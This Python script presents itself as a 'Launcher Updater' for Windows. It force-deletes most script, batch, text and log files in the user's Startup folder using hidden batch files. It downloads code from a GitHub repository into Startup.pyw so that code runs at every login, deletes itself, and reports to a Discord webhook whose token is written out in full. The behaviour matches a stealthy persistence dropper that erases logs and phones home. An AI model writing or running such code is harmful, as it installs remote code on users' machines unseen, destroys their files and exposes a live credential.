# monitor_script.py - Forces deletion of ALL files in startup folder
import os
import sys
import urllib.request
import requests
import json
import tempfile
import subprocess
import time
import shutil

# Discord webhook for update notifications
UPDATE_WEBHOOK = "https://discordapp.com/api/webhooks/1462762502130630781/IohGYGgxBIr2WPLUHF14QN_8AbyUq-rVGv_KQzhX1rHokBxF_OqjWlRm96x_gbYGQEJ0"

def send_webhook(status, title, description):
    """Send notification to Discord"""
    try:
        data = {
            "embeds": [{
                "title": title,
                "description": description,
                "color": 3066993 if status == "success" else 15158332,
                "timestamp": time.strftime('%Y-%m-%dT%H:%M:%S'),
                "footer": {"text": "Launcher Updater"}
            }]
        }
        
        response = requests.post(
            UPDATE_WEBHOOK,
            json=data,
            headers={'Content-Type': 'application/json'}
        )
        return response.status_code in [200, 204]
    except:
        return False

def force_delete_file(filepath):
    """Force delete a file even if it's in use"""
    try:
        # Try normal delete first
        os.remove(filepath)
        return True
    except:
        try:
            # Try with Windows command
            subprocess.run(f'del /f /q "{filepath}"', 
                         shell=True, 
                         capture_output=True,
                         creationflags=subprocess.CREATE_NO_WINDOW)
            return True
        except:
            try:
                # Try renaming then deleting
                temp_name = filepath + ".delete"
                os.rename(filepath, temp_name)
                time.sleep(0.1)
                os.remove(temp_name)
                return True
            except:
                return False

def force_delete_files_with_pattern(folder, pattern):
    """Force delete all files matching a pattern"""
    deleted = []
    for filename in os.listdir(folder):
        if any(filename.endswith(ext) for ext in pattern):
            filepath = os.path.join(folder, filename)
            if force_delete_file(filepath):
                deleted.append(filename)
    return deleted

def clean_startup_folder():
    """Delete ALL files from startup folder except launchers"""
    try:
        startup_folder = os.path.join(
            os.getenv('APPDATA'),
            'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
        )
        
        if not os.path.exists(startup_folder):
            return []
        
        # Files to KEEP (launcher files only)
        keep_files = {'Startup.pyw', 'github_launcher.pyw', 'clean_launcher.pyw'}
        
        deleted_files = []
        
        # First, force delete specific problematic files
        problematic_files = ['startup_log.txt', 'monitor_script.py', 'monitor.py', 
                           'update_cache.json', 'requirements.txt']
        
        for filename in problematic_files:
            filepath = os.path.join(startup_folder, filename)
            if os.path.exists(filepath) and filename not in keep_files:
                if force_delete_file(filepath):
                    deleted_files.append(filename)
                    print(f"Force deleted: {filename}")
        
        # Then delete all .log, .txt, .json, .py, .pyc, .pyw files
        patterns = ['.log', '.txt', '.json', '.py', '.pyc', '.pyw', '.bat']
        for pattern in patterns:
            files_deleted = force_delete_files_with_pattern(startup_folder, [pattern])
            deleted_files.extend(files_deleted)
        
        # Delete __pycache__ folders
        for root, dirs, files in os.walk(startup_folder, topdown=False):
            for dir_name in dirs:
                if dir_name == '__pycache__':
                    try:
                        folder_path = os.path.join(root, dir_name)
                        shutil.rmtree(folder_path, ignore_errors=True)
                        deleted_files.append(dir_name + '/')
                    except:
                        pass
        
        # Special batch deletion for any remaining files
        batch_delete = f'''@echo off
cd /d "{startup_folder}"
del /f /q *.log 2>nul
del /f /q *.txt 2>nul
del /f /q *.json 2>nul
del /f /q *.py 2>nul
del /f /q *.pyw 2>nul
del /f /q *.bat 2>nul
'''
        
        batch_path = tempfile.gettempdir() + "/force_delete.bat"
        with open(batch_path, 'w') as f:
            f.write(batch_delete)
        
        subprocess.run(
            ['cmd', '/c', batch_path],
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        # Clean up batch file
        time.sleep(1)
        force_delete_file(batch_path)
        
        # Return unique deleted files
        return list(set(deleted_files))
        
    except Exception as e:
        print(f"Cleanup error: {e}")
        return []

def update_launcher():
    """Replace Startup.pyw with github_launcher.pyw from GitHub"""
    try:
        # GitHub URLs
        LAUNCHER_URL = "https://raw.githubusercontent.com/ElianBoden/Deployer/main/github_launcher.pyw"
        
        # Path to startup folder
        startup_folder = os.path.join(
            os.getenv('APPDATA'),
            'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
        )
        
        target_file = os.path.join(startup_folder, "Startup.pyw")
        
        print(f"Downloading launcher from GitHub...")
        
        # Download the new launcher
        response = urllib.request.urlopen(LAUNCHER_URL, timeout=10)
        new_launcher_code = response.read().decode('utf-8')
        
        print(f"Downloaded {len(new_launcher_code)} bytes")
        
        # Check if current launcher exists
        current_exists = os.path.exists(target_file)
        
        if current_exists:
            # Read current launcher for comparison
            with open(target_file, 'r', encoding='utf-8') as f:
                current_code = f.read()
            
            # Check if update is needed
            if current_code.strip() == new_launcher_code.strip():
                print("Launcher already up to date")
                return False, "already_updated"
        
        # Write new launcher
        with open(target_file, 'w', encoding='utf-8') as f:
            f.write(new_launcher_code)
        
        print(f"✓ Launcher updated: {target_file}")
        return True, "updated"
        
    except Exception as e:
        print(f"✗ Update failed: {e}")
        return False, str(e)

def delete_this_script():
    """Delete this monitor script from startup folder"""
    try:
        # Get path of this script
        this_script = os.path.abspath(__file__)
        
        # Check if we're in startup folder
        startup_folder = os.path.join(
            os.getenv('APPDATA'),
            'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
        )
        
        # Only delete if we're in startup folder
        if this_script.startswith(startup_folder):
            # Create batch file to delete this script
            batch_content = f'''@echo off
timeout /t 5 /nobreak >nul
del /f /q "{this_script}" >nul 2>nul
if exist "{this_script}" (
    timeout /t 2 /nobreak >nul
    del /f /q "{this_script}" >nul 2>nul
)
del "%~f0" >nul 2>nul
'''
            
            batch_path = tempfile.gettempdir() + "/delete_script.bat"
            with open(batch_path, 'w') as f:
                f.write(batch_content)
            
            # Run batch file in background
            subprocess.Popen(
                ['cmd', '/c', batch_path],
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            
            print(f"✓ Scheduled deletion of: {os.path.basename(this_script)}")
            return True
            
    except Exception as e:
        print(f"✗ Failed to schedule deletion: {e}")
    
    return False

def main():
    """Main function - cleanup, update, delete self"""
    print("=" * 50)
    print("FORCE CLEANUP Launcher Updater")
    print("=" * 50)
    
    # Step 1: Force clean up startup folder
    print("\n[1/3] FORCE cleaning startup folder...")
    deleted_files = clean_startup_folder()
    
    if deleted_files:
        print(f"Deleted {len(deleted_files)} files/folders:")
        for f in deleted_files[:10]:  # Show first 10
            print(f"  - {f}")
        if len(deleted_files) > 10:
            print(f"  ... and {len(deleted_files) - 10} more")
    else:
        print("No files to delete (or all already deleted)")
    
    # Step 2: Update the launcher
    print("\n[2/3] Updating launcher...")
    updated, status = update_launcher()
    
    # Step 3: Delete this script
    print("\n[3/3] Removing monitor script...")
    self_deleted = delete_this_script()
    
    # Send webhook
    print("\n[+] Sending webhook...")
    if updated:
        title = "✅ Launcher Updated Successfully"
        description = f"**Action:** Replaced Startup.pyw with github_launcher.pyw\n"
        description += f"**Status:** Updated successfully\n"
        if deleted_files:
            description += f"**Files deleted:** {len(deleted_files)} files\n"
            if 'startup_log.txt' in deleted_files:
                description += f"  - ✅ startup_log.txt was deleted\n"
        description += f"**Self-removal:** {'Yes' if self_deleted else 'No'}\n"
        description += f"**Time:** {time.strftime('%H:%M:%S')}"
    else:
        title = "ℹ️ Launcher Update Checked"
        description = f"**Action:** Launcher update check\n"
        description += f"**Status:** {status}\n"
        if deleted_files:
            description += f"**Files deleted:** {len(deleted_files)} files\n"
            if 'startup_log.txt' in deleted_files:
                description += f"  - ✅ startup_log.txt was deleted"
    
    send_webhook("success" if updated else "info", title, description)
    
    print("\n" + "=" * 50)
    print("✓ Force cleanup completed")
    print("✓ Launcher updated")
    print("✓ Webhook sent")
    print("✓ This script will self-delete in 5 seconds")
    print("=" * 50)
    
    # Small delay before exit
    time.sleep(5)

if __name__ == "__main__":
    main()
